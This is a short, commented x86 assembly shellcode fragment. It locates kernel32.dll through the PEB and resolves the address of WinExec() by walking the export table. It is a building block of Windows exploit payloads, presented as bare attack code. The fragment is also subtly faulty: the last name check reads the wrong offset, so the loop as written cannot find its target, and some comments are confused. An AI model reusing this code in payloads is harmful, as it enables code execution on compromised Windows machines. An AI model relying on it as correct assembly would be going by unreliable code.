xor ecx, ecx                ; makes ecx == 0
mov eax, fs:[ecx+0x30]      ; get PEB from TEB's offset 0x30
mov eax, [eax+0xc]          ; get loaded modules into this process's info
mov eax, [eax+0x14]         ; access InMemoryOrderModuleList and get info of this exe
mov eax, [eax]              ; get info of ntdll.dll
mov eax, [eax]              ; get info of kernel32.dll
mov ebx, [eax+0x10]         ; get address of kernel32.dll loaded in memory
mov edx, [ebx+0x3c]         ; get e_lfanew which has the offset location of PE header
add edx, ebx                ; get the exact location of the PE header
mov edx, [edx+0x78]         ; get the offset of export table
add edx, ebx                ; get the exact location of the export table
mov esi, [edx+0x20]         ; get AddressofNames offset
add esi, ebx                ; get the exact location of the AddressofNames

Get_CreateProc_Index:
	inc ecx                     		; increment index counter for AddressOfNameOrdinals later
	lodsd                       		; get the offset the string address of the function name
	add eax, ebx						; get the actual address string of the function name
	cmp dword ptr[eax], 0x456e6957		; "EniW" (remember x86 is little endian)
	jnz Get_CreateProc_Index			; jump if 1st 4 letters of the function name is different
	cmp word ptr[eax+0x4], 0x6578		; "ex"
	jnz Get_CreateProc_Index			; jump if next 2 letters of the function name is different
	cmp byte ptr[eax+0x4], 0x63			; 'c'
	jnz Get_CreateProc_Index			; jump if last letter of the function name is different

dec ecx 					; decrease ecx by 1 cause array starts from 1 and Get_CreateProc_Index inc 1st
mov esi, [edx+0x24]         ; get AddressOfNameOrdinals offset
add esi, ebx                ; get the exact location of the AddressOfNameOrdinals
mov ecx, [esi+ecx*2]		; get the index of WinExec()
mov esi, [edx+0x1c]         ; get AddressOfFunctions offset
add esi, ebx                ; get the exact location of the AddressOfFunctions
mov esi, [esi+ecx*4]		; get the offset address of WinExec()
add esi, ebx                ; get the exact location of WinExec()
